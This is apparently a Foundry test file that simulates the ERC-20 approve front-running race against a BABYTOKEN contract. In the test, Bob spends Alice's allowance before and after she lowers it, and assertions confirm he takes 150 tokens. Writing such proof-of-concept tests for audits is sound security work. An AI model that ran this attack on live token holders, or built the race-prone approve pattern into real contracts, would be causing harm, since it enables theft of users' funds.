// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BABYTOKEN.sol";

contract BabyTokenTest is Test {
    BABYTOKEN token;
    address deployer = address(0xABCD);
    address marketingWallet = address(0xDEF); // Separate marketing wallet
    address alice = address(0x1);
    address bob = address(0x2);
    
    MockRouter router;
    MockFactory factory;
    MockDividendTracker tracker;
    uint256 private constant DECIMAL_PRECISION = 1e9;

    function setUp() public {
        vm.startPrank(deployer);
        
        // Setup mock contracts
        factory = new MockFactory();
        router = new MockRouter(address(factory));
        tracker = new MockDividendTracker();

        // BABYTOKEN parameters
        string memory name = "TestToken";
        string memory symbol = "TT";
        uint256 totalSupply = 1000000 * DECIMAL_PRECISION;
        address[4] memory addrs = [
            address(0x0),          // rewardToken
            address(router),        // router
            marketingWallet,        // distinct marketing wallet (not deployer)
            address(tracker)        // dividendTracker
        ];
        
        // Explicit conversion to uint256[3]
        uint256[3] memory feeSettings = [
            uint256(3), 
            uint256(3), 
            uint256(3)
        ];
        
        uint256 minTokens = 1;
        
        token = new BABYTOKEN(
            name,
            symbol,
            totalSupply,
            addrs,
            feeSettings,
            minTokens,
            address(0),
            0
        );
        
        // Configure token properties
        address[] memory excluded = new address[](2);
        excluded[0] = alice;
        excluded[1] = bob;
        token.excludeMultipleAccountsFromFees(excluded);
        
        // Fund Alice with tokens
        token.transfer(alice, 200 * DECIMAL_PRECISION);
        vm.stopPrank();
    }

    function test_ApproveFrontRunVulnerability() public {
        uint256 amount = 100 * DECIMAL_PRECISION;
        uint256 initialAliceBalance = token.balanceOf(alice);
        uint256 initialBobBalance = token.balanceOf(bob);

        console.log("--- BEFORE-Trigger Attack ---");
        console.log("Alice balance:", initialAliceBalance);
        console.log("Bob balance:", initialBobBalance);

        console.log("--- Trigger: Alice approves Bob ---");
        // Alice approves Bob
        vm.prank(alice);
        token.approve(bob, amount);

        console.log("--- Trigger: Bob executes front-run transfer ---");
        // Bob front-runs the approval reduction
        vm.prank(bob);
        token.transferFrom(alice, bob, amount);

        console.log("--- Trigger: Alice reduces approval ---");
        // Alice reduces approval (victim transaction)
        vm.prank(alice);
        token.approve(bob, amount / 2);

        console.log("--- Trigger: Bob uses reduced allowance ---");
        // Bob uses reduced allowance
        vm.prank(bob);
        token.transferFrom(alice, bob, amount / 2);

        console.log("--- AFTER-Trigger State ---");
        // Record state after all operations
        uint256 aliceBalanceAfter = token.balanceOf(alice);
        uint256 bobBalanceAfter = token.balanceOf(bob);
        console.log("Alice balance:", aliceBalanceAfter);
        console.log("Bob balance:", bobBalanceAfter);

        // Compute balance changes
        uint256 aliceLoss = initialAliceBalance - aliceBalanceAfter;
        uint256 bobGain = bobBalanceAfter - initialBobBalance;
        console.log("Alice tokens lost:", aliceLoss);
        console.log("Bob tokens gained:", bobGain);

        // Check vulnerability condition
        bool vulnerabilityExists = 
            (bobGain == 150 * DECIMAL_PRECISION) && 
            (aliceLoss == 150 * DECIMAL_PRECISION);

        // Output final vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Front-run attack successfully transferred unexpected amount of tokens");
        } else {
            console.log("Vulnerability not Exist: Balance changes match expected token amounts");
        }

        // Verification assertions
        assertEq(
            bobBalanceAfter,
            150 * DECIMAL_PRECISION,
            "Bob exploited front-run vulnerability"
        );
        assertEq(
            aliceBalanceAfter,
            initialAliceBalance - (150 * DECIMAL_PRECISION),
            "Alice lost tokens unexpectedly"
        );
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0xCAFE);
    }
}

contract MockRouter {
    address internal _factoryAddress;
    
    constructor(address factoryAddress) {
        _factoryAddress = factoryAddress;
    }
    
    function WETH() external pure returns (address) {
        return address(0);
    }
    
    function factory() external view returns (address) {
        return _factoryAddress;
    }
}

contract MockDividendTracker {
    function initialize(address, uint256) external pure {}
    function excludeFromDividends(address) external pure {}
}